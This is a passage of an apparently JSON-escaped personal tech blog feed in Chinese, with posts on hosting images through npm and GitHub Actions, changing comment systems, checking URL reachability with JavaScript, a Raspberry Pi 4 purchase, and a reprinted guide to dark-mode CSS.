class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" 